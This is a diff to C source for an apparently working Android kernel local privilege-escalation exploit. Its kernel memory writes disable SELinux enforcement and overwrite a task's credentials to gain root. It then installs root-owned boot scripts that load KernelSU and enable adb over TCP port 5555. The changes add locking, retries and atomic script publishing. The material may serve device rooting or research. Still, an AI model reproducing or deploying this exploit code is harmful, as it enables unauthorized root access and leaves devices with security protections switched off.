@@ -94,7 +94,7 @@ static int select_offsets(void) {
       unsetenv("PSELECT_ROUTE_DELAY_USEC");
       if (active_offsets->pselect_shift) {
         setenv("PSELECT_SHIFT", "-2", 1);
-        setenv("PSELECT_ROUTE_DELAY_USEC", "50000", 1);
+        /* setenv("PSELECT_ROUTE_DELAY_USEC", "50000", 1); */
       }
       pr_success("offsets matched: %s\n", active_offsets->uname_r);
       pr_info("pselect parameters: PSELECT_SHIFT=%s "
@@ -307,7 +307,7 @@ static void slab_drain(void) {
 #define WRITE_ATTEMPT_TIMEOUT_MSEC 60000
 
 static int run_isolated_write(uintptr_t target, const char *desc, int mode,
-                              int attempt) {
+                              int attempt, int drain_before_write) {
   pid_t pid = fork();
   if (pid < 0) {
     pr_error("%s attempt %d: fork failed errno=%d\n", desc, attempt, errno);
@@ -318,7 +318,7 @@ static int run_isolated_write(uintptr_t target, const char *desc, int mode,
      * an in-progress write worker (and its futex state) behind. */
     prctl(PR_SET_PDEATHSIG, SIGKILL);
     if (getppid() == 1) _exit(1);
-    slab_drain();
+    if (drain_before_write) slab_drain();
     int ran = do_one_write(target, desc, mode);
     _exit(ran ? 0 : 1);
   }
@@ -350,7 +350,7 @@ static int run_isolated_write(uintptr_t target, const char *desc, int mode,
 
 static int run_w1_attempt(int attempt) {
   return run_isolated_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1,
-                            attempt);
+                            attempt, 0);
 }
 
 /* The bootstrapper keeps only a compact state record under its own root-owned
@@ -358,6 +358,12 @@ static int run_w1_attempt(int attempt) {
  * a completed or failed run in /data/local/tmp. */
 #define BRIDGE_STATE_DIR "/data/adb/anchor"
 #define ROOT_SCRIPT_PATH BRIDGE_STATE_DIR "/bootstrap.sh"
+#define LATELOAD_DIR "/data/adb/late-load.d"
+#define LATELOAD_RECOVERY_PATH LATELOAD_DIR "/99-anchor-recover.sh"
+#define BOOTSTRAP_LOCK_ENV "ANCHOR_BOOTSTRAP_LOCK_DIR"
+
+static char bootstrap_lock_dir[512];
+static char bootstrap_lock_owner[512];
 
 static void prepare_bridge_state_dir(void) {
   mkdir("/data/adb", 0700);
@@ -384,22 +390,127 @@ static void cleanup_tmp_compat_files(void) {
   unlink("/data/local/tmp/a/e");
 }
 
+/* BOOT_COMPLETED and manual retries can overlap. The app supplies an
+ * app-private parent directory because this code runs as untrusted_app until
+ * the credential transition; /data/adb must only be touched after root. */
+static int prepare_bootstrap_lock_paths(void) {
+  const char *parent = getenv(BOOTSTRAP_LOCK_ENV);
+  if (!parent || parent[0] != '/') {
+    pr_error("bootstrap lock directory is unavailable\n");
+    return 0;
+  }
+  int dir_length = snprintf(bootstrap_lock_dir, sizeof(bootstrap_lock_dir),
+                            "%s/bootstrap.lock", parent);
+  int owner_length = snprintf(bootstrap_lock_owner,
+                              sizeof(bootstrap_lock_owner), "%s/owner",
+                              bootstrap_lock_dir);
+  if (dir_length < 0 || (size_t)dir_length >= sizeof(bootstrap_lock_dir) ||
+      owner_length < 0 || (size_t)owner_length >= sizeof(bootstrap_lock_owner)) {
+    pr_error("bootstrap lock path is too long\n");
+    return 0;
+  }
+  return 1;
+}
+
+/* A directory is an atomic single-flight lock. The owner PID lets a
+ * post-restart invocation reclaim a dead owner's lock immediately; the age
+ * fallback handles a torn owner file. */
+static int create_bootstrap_lock(void) {
+  if (mkdir(bootstrap_lock_dir, 0700) != 0) return 0;
+  int fd = open(bootstrap_lock_owner, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
+                0600);
+  if (fd < 0) {
+    rmdir(bootstrap_lock_dir);
+    return 0;
+  }
+  dprintf(fd, "%ld\n", (long)getpid());
+  close(fd);
+  return 1;
+}
+
+static int acquire_bootstrap_lock(void) {
+  if (!prepare_bootstrap_lock_paths()) return 0;
+  if (create_bootstrap_lock()) return 1;
+  if (errno != EEXIST) {
+    pr_error("cannot acquire bootstrap lock errno=%d\n", errno);
+    return 0;
+  }
+
+  char owner[32] = {0};
+  read_first_line(bootstrap_lock_owner, owner, sizeof(owner));
+  long owner_pid = strtol(owner, NULL, 10);
+  if (owner_pid > 0 && kill((pid_t)owner_pid, 0) != 0 && errno == ESRCH) {
+    unlink(bootstrap_lock_owner);
+    if (rmdir(bootstrap_lock_dir) == 0 && create_bootstrap_lock()) {
+      pr_info("reclaimed dead bootstrap lock pid=%ld\n", owner_pid);
+      return 1;
+    }
+  }
+
+  struct stat st;
+  time_t now = time(NULL);
+  if (stat(bootstrap_lock_dir, &st) == 0 && now != (time_t)-1 &&
+      now - st.st_mtime > 300) {
+    unlink(bootstrap_lock_owner);
+    if (rmdir(bootstrap_lock_dir) == 0 && create_bootstrap_lock()) {
+      pr_info("reclaimed stale bootstrap lock\n");
+      return 1;
+    }
+  }
+  pr_info("bootstrap already running; lock=%s\n", bootstrap_lock_dir);
+  return 0;
+}
+
+static void release_bootstrap_lock(void) {
+  unlink(bootstrap_lock_owner);
+  if (rmdir(bootstrap_lock_dir) != 0 && errno != ENOENT)
+    pr_error("cannot release bootstrap lock errno=%d\n", errno);
+}
+
+/* Publish scripts with rename(2), so ksud can never observe a truncated
+ * late-load handoff after a retry or a userspace restart. */
+static int publish_root_script(const char *path, const char *script) {
+  char tmp[160];
+  snprintf(tmp, sizeof(tmp), "%s.tmp.%ld", path, (long)getpid());
+  unlink(tmp);
+
+  int fd = open(tmp, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
+  if (fd < 0) return 0;
+
+  size_t length = strlen(script);
+  size_t written = 0;
+  while (written < length) {
+    ssize_t rc = write(fd, script + written, length - written);
+    if (rc > 0) {
+      written += (size_t)rc;
+      continue;
+    }
+    if (rc < 0 && errno == EINTR) continue;
+    close(fd);
+    unlink(tmp);
+    return 0;
+  }
+  if (fsync(fd) != 0 || close(fd) != 0 || chmod(tmp, 0700) != 0 ||
+      rename(tmp, path) != 0) {
+    unlink(tmp);
+    return 0;
+  }
+  return 1;
+}
+
 /* `late-load` deliberately changes the process environment and Magica may also
  * restart user space.  Do not put essential post-root work in the shell which
  * starts it: that shell can disappear mid-flight.  ksud runs every executable
  * in /data/adb/late-load.d synchronously after it has loaded KernelSU and its
  * sepolicy rules, but before it applies the dynamic-manager configuration.
  * Install a one-shot handoff there while the W2 child is root. */
-static void write_lateload_recovery_script(void) {
-  const char *dir = "/data/adb/late-load.d";
-  const char *path = "/data/adb/late-load.d/99-anchor-recover.sh";
+static int write_lateload_recovery_script(void) {
+  const char *dir = LATELOAD_DIR;
+  const char *path = LATELOAD_RECOVERY_PATH;
   prepare_bridge_state_dir();
-  mkdir(dir, 0755);
-
-  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
-  if (fd < 0) {
+  if (mkdir(dir, 0755) != 0 && errno != EEXIST) {
     pr_error("cannot install late-load recovery script errno=%d\n", errno);
-    return;
+    return 0;
   }
 
   const char *script =
@@ -407,10 +518,14 @@ static void write_lateload_recovery_script(void) {
     "STATE_DIR=/data/adb/anchor\n"
     "STATE=$STATE_DIR/bootstrap.state\n"
     "mkdir -p \"$STATE_DIR\" && chmod 700 \"$STATE_DIR\"\n"
-    "state() { printf 'result=%s\\n' \"$1\" > \"$STATE\"; chmod 600 \"$STATE\"; }\n"
+    "state() { printf 'result=%s\\nrc=%s\\nselinux=%s\\n' \"$1\" \"${2:-}\" \"$(getenforce 2>/dev/null || echo unknown)\" > \"$STATE\"; chmod 600 \"$STATE\"; }\n"
     "state late-load-running\n"
     "KSUD=/data/adb/ksud\n"
+    "if [ ! -f \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
+    "if [ ! -f \"$KSUD\" ]; then KSUD=$(find /data/app \\( -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' -o -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' \\) 2>/dev/null | head -n 1); fi\n"
+    "if [ -f \"$KSUD\" ]; then chmod 755 \"$KSUD\" 2>/dev/null; fi\n"
     "APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed -n 's/^package://p' | head -n 1)\n"
+    "if [ -z \"$APK\" ]; then APK=$(pm path me.weishu.kernelsu 2>/dev/null | sed -n 's/^package://p' | head -n 1); fi\n"
     "if [ -x \"$KSUD\" ] && [ -n \"$APK\" ]; then\n"
     "  \"$KSUD\" kernel dynamic-manager set-apk \"$APK\" >/dev/null 2>&1\n"
     "fi\n"
@@ -418,26 +533,24 @@ static void write_lateload_recovery_script(void) {
     "  \"$KSUD\" resetprop -p persist.adb.tcp.port 5555 >/dev/null 2>&1\n"
     "  \"$KSUD\" resetprop service.adb.tcp.port 5555 >/dev/null 2>&1\n"
     "fi\n"
-    "if command -v load_policy >/dev/null 2>&1; then\n"
-    "  load_policy /sys/fs/selinux/policy >/dev/null 2>&1\n"
-    "fi\n"
+    "POLICY_RC=127\n"
+    "if command -v load_policy >/dev/null 2>&1; then load_policy /sys/fs/selinux/policy >/dev/null 2>&1; POLICY_RC=$?; fi\n"
     "OPTIONS=/data/user/0/com.anchor.bootstrap/no_backup/options.conf\n"
     "if grep -qx 'disable_usb_debugging=1' \"$OPTIONS\" 2>/dev/null; then\n"
     "  settings put global adb_enabled 0 >/dev/null 2>&1\n"
     "fi\n"
-    "state late-load-complete\n"
-    "rm -f \"$0\"\n";
+    "state late-load-complete \"$POLICY_RC\"\n"
+    "rm -f /data/adb/late-load.d/99-anchor-recover.sh\n";
 
-  if (write(fd, script, strlen(script)) != (ssize_t)strlen(script))
+  if (!publish_root_script(path, script)) {
     pr_error("cannot write late-load recovery script errno=%d\n", errno);
-  close(fd);
-  chmod(path, 0700);
+    return 0;
+  }
+  return 1;
 }
 
-static void write_root_script(void) {
+static int write_root_script(void) {
   prepare_bridge_state_dir();
-  int sfd = open(ROOT_SCRIPT_PATH, O_WRONLY|O_CREAT|O_TRUNC, 0700);
-  if (sfd < 0) return;
   const char *script =
     "#!/system/bin/sh\n"
     "STATE_DIR=/data/adb/anchor\n"
@@ -448,9 +561,11 @@ static void write_root_script(void) {
     "trap cleanup EXIT\n"
     "rm -f /data/local/tmp/a/ghostlock_postroot.log\n"
     "state root-handoff-running\n"
-    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
+    "KSUD=/data/adb/ksud\n"
+    "if [ ! -f \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
+    "if [ ! -f \"$KSUD\" ]; then KSUD=$(find /data/app \\( -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' -o -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' \\) 2>/dev/null | head -n 1); fi\n"
     "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+    "  rm -f /data/adb/late-load.d/99-anchor-recover.sh\n"
     "  state root-ready\n"
     "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
     "  chmod 755 \"$KSUD\" 2>/dev/null\n"
@@ -463,14 +578,22 @@ static void write_root_script(void) {
     "    grep -q kernelsu /proc/modules 2>/dev/null && break\n"
     "    sleep 1\n"
     "  done\n"
-    "  grep -q kernelsu /proc/modules 2>/dev/null && state root-ready || state root-unavailable\n"
+    "  if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+    "    for w in $(seq 1 15); do\n"
+    "      grep -qx 'result=late-load-complete' \"$STATE\" 2>/dev/null && break\n"
+    "      sleep 1\n"
+    "    done\n"
+    "    grep -qx 'result=late-load-complete' \"$STATE\" 2>/dev/null && state root-ready || state root-ready-late-load-pending\n"
+    "  else state root-unavailable; fi\n"
     "else\n"
     "  state root-unavailable\n"
     "fi\n"
     "exit 0\n";
-  write(sfd, script, strlen(script));
-  close(sfd);
-  chmod(ROOT_SCRIPT_PATH, 0700);
+  if (!publish_root_script(ROOT_SCRIPT_PATH, script)) {
+    pr_error("cannot write root handoff script errno=%d\n", errno);
+    return 0;
+  }
+  return 1;
 }
 
 /* perf_find_task - only used when perf is available (shell context) */
@@ -602,12 +725,14 @@ static void child_main(struct child_pipes *p) {
   /* /data/adb is inaccessible to the shell process.  Create both the
    * root-owned state directory and its short-lived handoff script only after
    * the credential transition has completed. */
-  write_root_script();
-  if (access(ROOT_SCRIPT_PATH, X_OK) != 0) {
+  if (!write_root_script() || access(ROOT_SCRIPT_PATH, X_OK) != 0) {
     write_bridge_state("root-script-unavailable");
     _exit(1);
   }
-  write_lateload_recovery_script();
+  if (!write_lateload_recovery_script()) {
+    write_bridge_state("late-load-script-unavailable");
+    _exit(1);
+  }
   pid_t gc = fork();
   if (gc == 0) {
     int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
@@ -671,6 +796,10 @@ int run_exploit(int argc, char **argv) {
   /* Phase 1: Disable SELinux */
   int selinux_ok = check_selinux_off();
   if (!selinux_ok) {
+    /* Match upstream behavior: drain once before the five W1 attempts, not
+     * once inside every retry. */
+    slab_drain();
+    TIMER("pre-W1 drain");
     for (int att = 1; att <= 5 && !selinux_ok; att++) {
       pr_info("Write 1 attempt %d/5\n", att);
       run_w1_attempt(att);
@@ -722,7 +851,7 @@ int run_exploit(int argc, char **argv) {
   for (int round = 1; round <= 10 && !got_root; round++) {
     pr_info("round %d/10: cred write\n", round);
     if (!run_isolated_write(child_task + TASK_CRED_OFF, "W2: cred", 2,
-                            round))
+                            round, 1))
       continue;
     usleep(50000);
     uint32_t child_uid = 9999;
@@ -755,8 +884,12 @@ int run_exploit(int argc, char **argv) {
   for (int i = 0; i < 60; i++) {
     if (system("su -c 'id' > /dev/null 2>&1") == 0) {
       pr_success("su ready, fixing SELinux policy\n");
-      system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
-      pr_success("load_policy done\n");
+      int policy_rc = system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
+      if (policy_rc == 0)
+        pr_success("immediate load_policy done\n");
+      else
+        pr_error("immediate load_policy failed rc=%d; late-load recovery remains armed\n",
+                 policy_rc);
       su_ready = 1;
       break;
     }
@@ -788,6 +921,8 @@ static int run_bootstrap(void) {
    * must remain available to the app while it is running. */
   set_unbuffer();
   log_startup_context();
+  if (!acquire_bootstrap_lock()) return 1;
+  int result = 1;
 
   /* Wait for adb TCP on port 5555 */
   pr_info("Waiting for adb TCP on port 5555...\n");
@@ -807,7 +942,7 @@ static int run_bootstrap(void) {
     usleep(1000000);
   }
   pr_error("adbd not on TCP 5555 after 30s; run 'adb tcpip 5555' from the PC first\n");
-  return 1;
+  goto done;
 tcp_ready:
   usleep(200000);
   pr_info("Connecting via mini-adb...\n");
@@ -818,14 +953,17 @@ tcp_ready:
     "rm -f /data/local/tmp/.ghostlock_root.sh /data/local/tmp/.ghostlock_w1 "
     "/data/local/tmp/a/ghostlock_postroot.log /data/local/tmp/a/adbkey "
     "/data/local/tmp/a/adbkey.pub /data/local/tmp/a/e; "
-    "APK=$(pm path " ANCHOR_BOOTSTRAP_PACKAGE " | sed -n 's/^package://p' | head -n 1); "
-    "APPBIN=${APK%/base.apk}/lib/arm64/libanchor.so; "
-    "if [ -n \"$APPBIN\" ] && [ -x \"$APPBIN\" ]; then "
-    "\"$APPBIN\"; RC=$?; "
-    "else RC=126; fi; printf '\\n__ANCHOR_RC=%s\\n' \"$RC\"; exit \"$RC\"");
+    "APK=$(pm path " ANCHOR_BOOTSTRAP_PACKAGE " 2>/dev/null | sed -n 's/^package://p' | head -n 1); "
+    "if [ -z \"$APK\" ]; then RC=127; STAGE=apk-not-found; "
+    "else APPBIN=${APK%/base.apk}/lib/arm64/libanchor.so; "
+    "if [ -x \"$APPBIN\" ]; then \"$APPBIN\"; RC=$?; STAGE=anchor-exited; "
+    "else RC=126; STAGE=appbin-not-executable; fi; fi; "
+    "printf '\\n__ANCHOR_STAGE=%s\\n__ANCHOR_RC=%s\\n' \"$STAGE\" \"$RC\"; exit \"$RC\"");
   pr_info("mini-adb returned %d\n", adb_ret);
-
-  return adb_ret;
+  result = adb_ret;
+done:
+  release_bootstrap_lock();
+  return result;
 }
 
 static int run_write1_only(void) {
